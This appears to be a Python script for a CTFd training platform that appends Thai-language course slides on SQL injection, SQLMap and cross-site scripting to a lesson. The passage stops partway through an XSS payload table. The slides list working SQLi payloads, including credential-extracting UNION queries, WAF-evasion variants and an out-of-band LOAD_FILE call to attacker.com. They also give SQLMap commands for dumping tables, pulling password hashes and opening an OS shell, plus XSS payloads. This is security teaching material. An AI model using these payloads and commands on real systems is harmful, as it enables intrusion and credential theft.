import json
import sys
sys.path.insert(0, '/opt/CTFd')
from CTFd import create_app
from CTFd.plugins.tutorials import TutorialLesson

app = create_app()

# New content to append to Block 0 of Lesson 178
new_content = """

---

### 📄 SLIDE 91-115: SQL Injections (SQLi) - การโจมตีฐานข้อมูลผ่านคำสั่ง SQL

**SQL Injection (SQLi)** คือหนึ่งในช่องโหว่เว็บที่อันตรายที่สุด โดยผู้โจมตีสามารถฝังคำสั่ง SQL ที่เป็นอันตรายเข้าไปในช่องรับข้อมูล ที่แอปพลิเคชันนำไปใช้ในคำสั่งฐานข้อมูลโดยตรง

- เมื่อแอปพลิเคชัน **ไม่กรองอินพุตของผู้ใช้งาน** อย่างเหมาะสม ผู้โจมตีสามารถฝัง SQL statements ที่เป็นอันตราย
- อ้างอิง: [How to Stop SQL Injection](https://www.indusface.com/blog/how-to-stop-sql-injection/)

<div style="background:#0a0d1a; border:1px solid rgba(0,240,255,0.12); border-radius:10px; padding:20px; margin:1.5rem 0;">
<div style="font-size:0.82rem; color:#00f0ff; font-weight:bold; margin-bottom:14px; text-transform:uppercase; letter-spacing:0.07em;"><i class="fas fa-database mr-2"></i> ประเภทของ SQL Injection</div>

<div style="display:grid; grid-template-columns:1fr 1fr; gap:12px;">
<div style="background:rgba(255,0,127,0.06); border:1px solid rgba(255,0,127,0.2); border-radius:8px; padding:14px;">
<div style="color:#ff007f; font-weight:bold; font-size:0.85rem; margin-bottom:8px;">🔐 Authentication Bypass</div>
<div style="color:#cbd5e1; font-size:0.8rem; line-height:1.6;">ใช้ SQL comment (<code style="color:#fbbf24;">--</code>) เพื่อตัดส่วน password check ออก ทำให้ล็อกอินโดยไม่ต้องรู้รหัสผ่าน</div>
</div>
<div style="background:rgba(251,191,36,0.06); border:1px solid rgba(251,191,36,0.2); border-radius:8px; padding:14px;">
<div style="color:#fbbf24; font-weight:bold; font-size:0.85rem; margin-bottom:8px;">📤 Data Stealing (OR '1'='1')</div>
<div style="color:#cbd5e1; font-size:0.8rem; line-height:1.6;">ใช้ตรรกะ <code style="color:#fbbf24;">OR '1'='1'</code> ทำให้เงื่อนไขเป็นจริงเสมอ ดึงข้อมูลทุก record ออกมา</div>
</div>
<div style="background:rgba(0,240,255,0.06); border:1px solid rgba(0,240,255,0.2); border-radius:8px; padding:14px;">
<div style="color:#00f0ff; font-weight:bold; font-size:0.85rem; margin-bottom:8px;">🔗 UNION-Based SQLi</div>
<div style="color:#cbd5e1; font-size:0.8rem; line-height:1.6;">ต่อผลลัพธ์ของ query ที่สองเข้ากับ query เดิม เพื่อดึง username/password จาก table อื่น</div>
</div>
<div style="background:rgba(168,85,247,0.06); border:1px solid rgba(168,85,247,0.2); border-radius:8px; padding:14px;">
<div style="color:#a855f7; font-weight:bold; font-size:0.85rem; margin-bottom:8px;">🕵️ Blind SQLi (Boolean)</div>
<div style="color:#cbd5e1; font-size:0.8rem; line-height:1.6;">ใช้ฟังก์ชัน <code style="color:#fbbf24;">SUBSTRING()</code> ถาม-ตอบทีละตัวอักษร เพื่อค้นหาชื่อฐานข้อมูลโดยไม่มี error แสดง</div>
</div>
</div>
</div>

#### 🔍 Normal SQL Query (Query ปกติ)
เมื่อผู้ใช้งานกรอก username: `admin` และ password: `p@ssW0rd`:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'p@ssW0rd';
```

#### 💥 Error-Based SQLi: Bypassing Authentication (ข้ามการยืนยันตัวตน)
เมื่อผู้โจมตีกรอก username: `admin' --` และ password ใดก็ได้:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'xxx';
```
เครื่องหมาย `--` จะ **comment ออก** ส่วนที่เหลือของ query ทำให้ข้ามการตรวจสอบรหัสผ่าน

#### 💥 Error-Based SQLi: Stealing Data (ดึงข้อมูลทั้งหมด)
เมื่อผู้โจมตีป้อน User ID: `' OR '1'='1`:
```sql
SELECT id,name FROM users WHERE id = '' OR '1'='1';
```
ผลลัพธ์: ดึง record ทุกอัน เพราะ `F OR T = True` เสมอ

#### 💥 UNION-Based SQLi (ดึง username & password)
เมื่อผู้โจมตีป้อน User ID: `' UNION SELECT username,password FROM users --`:
```sql
SELECT id,name FROM users WHERE id = '' UNION SELECT username,password FROM users --';
```
ผลลัพธ์: แสดง username และ password ทุก account ในระบบ

#### 💥 Blind SQL Injection (Boolean-based)
เมื่อผู้โจมตีป้อน: `' OR (SELECT SUBSTRING(database(),1,1)) = 'm' --`:
```sql
SELECT id,name FROM users WHERE id = '' OR (SELECT SUBSTRING(database(),1,1)) = 'm' --';
```
ถ้าชื่อฐานข้อมูลขึ้นต้นด้วย `m` จะ load หน้าปกติ ถ้าไม่ใช่จะแสดง No Result — ใช้เดาชื่อ database ทีละตัวอักษร

---

#### 📋 SQL Injection Payloads สำคัญ ([Payload List Reference](https://github.com/payloadbox/sql-injection-payload-list))

<div style="background:#070a13; border:1px solid rgba(255,255,255,0.06); border-radius:8px; overflow:hidden; margin:1rem 0;">
<table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
<thead>
<tr style="background:rgba(0,240,255,0.08); border-bottom:1px solid rgba(0,240,255,0.15);">
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700; white-space:nowrap;">Category</th>
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Payload</th>
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td rowspan="4" style="padding:10px 14px; color:#fbbf24; font-weight:600; vertical-align:top; white-space:nowrap;">Authentication Bypass</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' OR '1'='1' --</td>
<td style="padding:8px 14px; color:#94a3b8;">Bypasses login by always returning true</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">admin' --</td>
<td style="padding:8px 14px; color:#94a3b8;">Logs in as "admin" by commenting out the password check</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' OR 1=1 --</td>
<td style="padding:8px 14px; color:#94a3b8;">Classic authentication bypass</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' OR 'x'='x' --</td>
<td style="padding:8px 14px; color:#94a3b8;">Another variation of authentication bypass</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td rowspan="4" style="padding:10px 14px; color:#00f0ff; font-weight:600; vertical-align:top; white-space:nowrap;">UNION-Based SQLi</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' UNION SELECT null,username,password FROM users --</td>
<td style="padding:8px 14px; color:#94a3b8;">Extracts usernames and passwords</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' UNION SELECT database(),user(),version() --</td>
<td style="padding:8px 14px; color:#94a3b8;">Retrieves database details</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --</td>
<td style="padding:8px 14px; color:#94a3b8;">Lists all tables in the database</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --</td>
<td style="padding:8px 14px; color:#94a3b8;">Lists all column names in the "users" table</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td rowspan="3" style="padding:10px 14px; color:#ef4444; font-weight:600; vertical-align:top; white-space:nowrap;">Error-Based SQLi</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' AND (SELECT @@version) --</td>
<td style="padding:8px 14px; color:#94a3b8;">Returns the database version</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' AND 1=convert(int,(SELECT @@version)) --</td>
<td style="padding:8px 14px; color:#94a3b8;">Forces an error that leaks the database version</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' AND (SELECT database()) --</td>
<td style="padding:8px 14px; color:#94a3b8;">Retrieves the current database name</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td rowspan="2" style="padding:10px 14px; color:#a855f7; font-weight:600; vertical-align:top; white-space:nowrap;">Boolean-Based Blind SQLi</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' AND (SELECT SUBSTRING(database(),1,1)) = 'm' --</td>
<td style="padding:8px 14px; color:#94a3b8;">Checks if the first letter of the database is 'm'</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' AND (SELECT COUNT(*) FROM users) > 5 --</td>
<td style="padding:8px 14px; color:#94a3b8;">Checks if the number of users is greater than 5</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td rowspan="2" style="padding:10px 14px; color:#3ddc84; font-weight:600; vertical-align:top; white-space:nowrap;">Time-Based Blind SQLi</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' OR IF(1=1, SLEEP(5), 0) --</td>
<td style="padding:8px 14px; color:#94a3b8;">Delays execution for 5 seconds if condition is true</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' OR IF(ASCII(SUBSTRING((SELECT database()),1,1))>109, SLEEP(5), 0) --</td>
<td style="padding:8px 14px; color:#94a3b8;">Extracts the first letter of the database using time delay</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:10px 14px; color:#fbbf24; font-weight:600; vertical-align:top; white-space:nowrap;">Out-of-Band (OOB)</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">' UNION SELECT LOAD_FILE('//attacker.com/data') --</td>
<td style="padding:8px 14px; color:#94a3b8;">Attempts to load a file from an external server</td>
</tr>
<tr>
<td rowspan="3" style="padding:10px 14px; color:#64748b; font-weight:600; vertical-align:top; white-space:nowrap;">WAF Bypass</td>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">admin'/**/OR/**/1=1/**/--</td>
<td style="padding:8px 14px; color:#94a3b8;">Uses comments to bypass filters</td>
</tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">AdMiN' Or '1'='1' --</td>
<td style="padding:8px 14px; color:#94a3b8;">Uses mixed case to evade case-sensitive filters</td>
</tr>
<tr>
<td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">%27%20OR%201=1--</td>
<td style="padding:8px 14px; color:#94a3b8;">URL-encoded SQL injection payload</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SQLMap — เครื่องมือตรวจจับและโจมตี SQLi อัตโนมัติ

**SQLMap** คือเครื่องมืออัตโนมัติที่ตรวจจับและโจมตีช่องโหว่ SQL Injection โดยสามารถ dump ฐานข้อมูล, ดึง user & password และควบคุม server ได้

- อ้างอิง: [TryHackMe SQLMap Room](https://tryhackme.com/room/sqlmap)

#### ⚙️ SQLMap Command Options: Basic Usage

<div style="background:#070a13; border:1px solid rgba(255,255,255,0.06); border-radius:8px; overflow:hidden; margin:1rem 0;">
<table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
<thead>
<tr style="background:rgba(0,240,255,0.08); border-bottom:1px solid rgba(0,240,255,0.15);">
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Command</th>
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">-u &lt;URL&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Target URL (e.g., -u "http://target.com/index.php?id=1")</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--data "&lt;POST_DATA&gt;"</td><td style="padding:8px 14px; color:#94a3b8;">Inject SQL in POST requests (e.g., --data="username=admin&password=123")</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--method &lt;METHOD&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Specify HTTP method (GET, POST, PUT, etc.)</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--cookie "&lt;COOKIE&gt;"</td><td style="padding:8px 14px; color:#94a3b8;">Use session cookies for authentication</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--random-agent</td><td style="padding:8px 14px; color:#94a3b8;">Randomly selects a User-Agent to bypass detection</td></tr>
<tr><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--proxy "&lt;PROXY&gt;"</td><td style="padding:8px 14px; color:#94a3b8;">Route traffic through a proxy (e.g., --proxy="http://127.0.0.1:8080")</td></tr>
</tbody>
</table>
</div>

#### ⚙️ SQLMap Command Options: Database Enumeration

<div style="background:#070a13; border:1px solid rgba(255,255,255,0.06); border-radius:8px; overflow:hidden; margin:1rem 0;">
<table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
<thead>
<tr style="background:rgba(0,240,255,0.08); border-bottom:1px solid rgba(0,240,255,0.15);">
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Command</th>
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--dbs</td><td style="padding:8px 14px; color:#94a3b8;">List available databases</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">-D &lt;database&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Select a specific database</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--tables</td><td style="padding:8px 14px; color:#94a3b8;">List all tables in the selected database</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">-T &lt;table&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Select a specific table</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--columns</td><td style="padding:8px 14px; color:#94a3b8;">List all columns of a specific table</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">-C &lt;column&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Select specific columns</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--schema</td><td style="padding:8px 14px; color:#94a3b8;">Dump entire database schema</td></tr>
<tr><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--count</td><td style="padding:8px 14px; color:#94a3b8;">Get row count of tables</td></tr>
</tbody>
</table>
</div>

#### ⚙️ SQLMap Command Options: Data Extraction

<div style="background:#070a13; border:1px solid rgba(255,255,255,0.06); border-radius:8px; overflow:hidden; margin:1rem 0;">
<table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
<thead>
<tr style="background:rgba(0,240,255,0.08); border-bottom:1px solid rgba(0,240,255,0.15);">
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Command</th>
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--dump</td><td style="padding:8px 14px; color:#94a3b8;">Dump data from the database</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--dump-all</td><td style="padding:8px 14px; color:#94a3b8;">Dump all databases</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--where "&lt;condition&gt;"</td><td style="padding:8px 14px; color:#94a3b8;">Extract data based on a condition (--where="id=1")</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--exclude-sysdbs</td><td style="padding:8px 14px; color:#94a3b8;">Exclude system databases (mysql, information_schema, etc.)</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--sql-query "&lt;SQL_QUERY&gt;"</td><td style="padding:8px 14px; color:#94a3b8;">Execute a custom SQL query</td></tr>
<tr><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--sql-shell</td><td style="padding:8px 14px; color:#94a3b8;">Open an interactive SQL shell</td></tr>
</tbody>
</table>
</div>

#### ⚙️ SQLMap Command Options: Advanced Exploitation

<div style="background:#070a13; border:1px solid rgba(255,255,255,0.06); border-radius:8px; overflow:hidden; margin:1rem 0;">
<table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
<thead>
<tr style="background:rgba(0,240,255,0.08); border-bottom:1px solid rgba(0,240,255,0.15);">
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Command</th>
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--passwords</td><td style="padding:8px 14px; color:#94a3b8;">Retrieve database password hashes</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--privileges</td><td style="padding:8px 14px; color:#94a3b8;">Show database user privileges</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--roles</td><td style="padding:8px 14px; color:#94a3b8;">Show database user roles</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--users</td><td style="padding:8px 14px; color:#94a3b8;">List all database users</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--current-user</td><td style="padding:8px 14px; color:#94a3b8;">Get the current database user</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--current-db</td><td style="padding:8px 14px; color:#94a3b8;">Get the current database name</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--is-dba</td><td style="padding:8px 14px; color:#94a3b8;">Check if the user has DBA privileges</td></tr>
<tr><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--hostname</td><td style="padding:8px 14px; color:#94a3b8;">Get the database server hostname</td></tr>
</tbody>
</table>
</div>

#### ⚙️ SQLMap Command Options: Bypassing Security

<div style="background:#070a13; border:1px solid rgba(255,255,255,0.06); border-radius:8px; overflow:hidden; margin:1rem 0;">
<table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
<thead>
<tr style="background:rgba(0,240,255,0.08); border-bottom:1px solid rgba(0,240,255,0.15);">
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Command</th>
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--tamper=&lt;script&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Use tamper scripts to bypass WAFs (e.g., --tamper=randomcase)</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--hex</td><td style="padding:8px 14px; color:#94a3b8;">Encode payloads in hexadecimal to bypass filters</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--no-cast</td><td style="padding:8px 14px; color:#94a3b8;">Prevent SQLMap from using automatic type casting</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--delay &lt;SECONDS&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Add delay between requests to avoid detection</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--safe-url "&lt;URL&gt;"</td><td style="padding:8px 14px; color:#94a3b8;">Specify a safe URL for testing</td></tr>
<tr><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--safe-freq &lt;NUMBER&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Number of requests after which the safe URL is checked</td></tr>
</tbody>
</table>
</div>

#### ⚙️ SQLMap Command Options: Blind SQL Injection Techniques

<div style="background:#070a13; border:1px solid rgba(255,255,255,0.06); border-radius:8px; overflow:hidden; margin:1rem 0;">
<table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
<thead>
<tr style="background:rgba(0,240,255,0.08); border-bottom:1px solid rgba(0,240,255,0.15);">
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Command</th>
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--technique=&lt;B,T,U,E,S,Q&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Specify attack techniques (B=Boolean, T=Time, U=Union, E=Error, S=Stacked, Q=Inline)</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--time-sec=&lt;SECONDS&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Set time delay for time-based blind SQLi</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--level=&lt;1-5&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Increase testing level (default: 1)</td></tr>
<tr><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.78rem;">--risk=&lt;1-3&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Increase risk level (default: 1)</td></tr>
</tbody>
</table>
</div>

#### 💻 ตัวอย่างการใช้งาน SQLMap จริง
```bash
# Check if a Target is Vulnerable
sqlmap -u "http://target.com/index.php?id=1" --dbs

# Enumerate Database Tables
sqlmap -u "http://target.com/index.php?id=1" -D target_db --tables

# Enumerate Columns in a Table
sqlmap -u "http://target.com/index.php?id=1" -D target_db -T users --columns

# Dump Data from a Table
sqlmap -u "http://target.com/index.php?id=1" -D target_db -T users --dump
```

```bash
# Bypass Web Application Firewalls (WAFs)
sqlmap -u "http://target.com/index.php?id=1" --tamper=randomcase

# Evade Login Forms (Automatic Authentication Bypass)
sqlmap -u "http://target.com/login.php" --data="username=admin&password=admin" --dump

# Extracting Password Hashes
sqlmap -u "http://target.com/index.php?id=1" --passwords
```

```bash
# Gain Shell Access
sqlmap -u "http://target.com/index.php?id=1" --os-shell

# Extract Database Administrator Accounts
sqlmap -u "http://target.com/index.php?id=1" --privileges

# Run a Custom SQL Query
sqlmap -u "http://target.com/index.php?id=1" --sql-query="SELECT user, password FROM users"
```

---

### 📄 SLIDE 116-125: Cross-Site Scripting (XSS) — การฝังสคริปต์อันตรายในเว็บ

**Cross-Site Scripting (XSS)** คือการโจมตีฝั่ง client ที่ผู้โจมตีฝัง JavaScript อันตรายลงในหน้าเว็บที่ผู้ใช้งานเปิดอ่าน สามารถใช้ขโมย session token, cookie, password หรือกระทำการแทนเหยื่อ

<div style="background:#0a0d1a; border:1px solid rgba(0,240,255,0.12); border-radius:10px; padding:20px; margin:1.5rem 0;">
<div style="font-size:0.82rem; color:#00f0ff; font-weight:bold; margin-bottom:14px; text-transform:uppercase; letter-spacing:0.07em;"><i class="fas fa-code mr-2"></i> ประเภทของ XSS</div>
<div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px;">
<div style="background:rgba(255,0,127,0.06); border:1px solid rgba(255,0,127,0.2); border-radius:8px; padding:14px;">
<div style="color:#ff007f; font-weight:bold; font-size:0.85rem; margin-bottom:8px;">💾 Stored XSS (Persistent)</div>
<div style="color:#cbd5e1; font-size:0.8rem; line-height:1.6;">Payload ถูกบันทึกลงฐานข้อมูล ทุกคนที่เปิดหน้านั้นจะโดน XSS</div>
<div style="margin-top:8px; font-family:monospace; font-size:0.73rem; color:#fbbf24; background:rgba(0,0,0,0.3); padding:6px; border-radius:4px;">&lt;script&gt;alert('XSS');&lt;/script&gt;</div>
</div>
<div style="background:rgba(251,191,36,0.06); border:1px solid rgba(251,191,36,0.2); border-radius:8px; padding:14px;">
<div style="color:#fbbf24; font-weight:bold; font-size:0.85rem; margin-bottom:8px;">🔗 Reflected XSS (Non-Persistent)</div>
<div style="color:#cbd5e1; font-size:0.8rem; line-height:1.6;">Payload อยู่ใน URL และรันทันทีที่เหยื่อคลิกลิงก์</div>
<div style="margin-top:8px; font-family:monospace; font-size:0.73rem; color:#fbbf24; background:rgba(0,0,0,0.3); padding:6px; border-radius:4px;">?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
</div>
<div style="background:rgba(0,240,255,0.06); border:1px solid rgba(0,240,255,0.2); border-radius:8px; padding:14px;">
<div style="color:#00f0ff; font-weight:bold; font-size:0.85rem; margin-bottom:8px;">🌐 DOM-Based XSS</div>
<div style="color:#cbd5e1; font-size:0.8rem; line-height:1.6;">Payload แก้ไข DOM โดยตรง ไม่ส่งไปเซิร์ฟเวอร์ ซ่อนตัวได้ดีกว่า</div>
<div style="margin-top:8px; font-family:monospace; font-size:0.73rem; color:#fbbf24; background:rgba(0,0,0,0.3); padding:6px; border-radius:4px;">#&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
</div>
</div>
</div>

#### 📋 Common XSS Payloads

<div style="background:#070a13; border:1px solid rgba(255,255,255,0.06); border-radius:8px; overflow:hidden; margin:1rem 0;">
<table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
<thead>
<tr style="background:rgba(0,240,255,0.08); border-bottom:1px solid rgba(0,240,255,0.15);">
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Payload</th>
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">&lt;script&gt;alert('XSS')&lt;/script&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Simple alert box</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Closing attributes to break out</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">&lt;img src=x onerror=alert('XSS')&gt;</td><td style="padding:8px 14px; color:#94a3b8;">XSS via image error</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">&lt;svg/onload=alert('XSS')&gt;</td><td style="padding:8px 14px; color:#94a3b8;">XSS using SVG</td></tr>
